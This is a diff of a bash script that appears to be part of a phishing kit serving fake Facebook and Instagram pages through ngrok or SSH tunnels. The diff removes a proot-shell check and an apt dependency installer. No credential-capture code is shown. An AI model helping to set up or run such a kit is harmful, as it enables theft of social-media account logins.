@@ -65,18 +65,8 @@ serviceKey=0
 listenKey=0
 tunnelKey=0
 
-listReq=("php" "jq" "curl" "tar" "toilet" "figlet" "ssh")
 services=("facebook" "instagram")
 tunnels=("ngrok" "ssh")
-
-verifySystemOs() {
-    proot=$(ps -e | grep -Eo "proot")
-
-    if [ -z "$proot" ] ; then
-	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mRun this program in a proot shell\e[0m"
-	interruptTwo
-    fi
-}
 
 verifyLinks() {
     if [ "$1" == "null" -a "$2" == "null" ] ; then
@@ -107,7 +97,6 @@ listen() {
 }
 
 functionGroup() {
-    verifySystemOs
     removeFiles
     copyFiles
     processKill
@@ -278,9 +267,7 @@ list() {
 
 installReqIfNotExists() {
     [ -d /usr/bin ] && dir=/usr/bin
-    [ -d $PREFIX/bin ] && dir=$PREFIX/bin
-
-    installForApt # Instala requisitos 
+    [ -d $PREFIX/bin ] && dir=$PREFIX/bin 
 
     case "$(dpkg --print-architecture)" in
 	aarch64)
@@ -319,40 +306,6 @@ installReqIfNotExists() {
 	rm ngrok-v3-stable-linux-${arch}.tgz
     fi
 }
-
-installForApt() {
-    for package in ${listReq[*]} ; do
-
-        if [ ! -f ${dir}/${package} ] ; then
-	    if [ -d "$PREFIX" ] ; then
-
-		if [ $package == "ssh" ] ; then
-		    package="openssh"
-		fi
-
-	        while [ ! -f ${dir}/${package} ] ; do
-	            printf "\r\e[33;1m[*] Installing $package...\e[0m"
-		    apt update > /dev/null 2>&1
-		    apt install $package -y > /dev/null 2>&1
- 	        done
-	        printf "\r\e[33;1m[+] Installing $package...\e[32;1mOK\e[0m\n"
-            else
-		if [ $package == "ssh" ] ; then
-		    package="openssh-server"
-		fi
-
-	        while [ ! -f $dir/$package ] ; do
-		    echo -e "\e[33;1m[*] Installing $package...\e[0m"
-		    apt-get update
-		    apt-get upgrade -y
-		    apt-get install $package -y
-		done
-		echo -e "\e[33;1m[+] Installing $package...\e[32;1mOK\e[0m"
-	    fi
-	fi
-    done
-}
-
 
 rerun() {
     echo -e "\e[0mRun that attack again? [y/n] : \e[0m" ; read
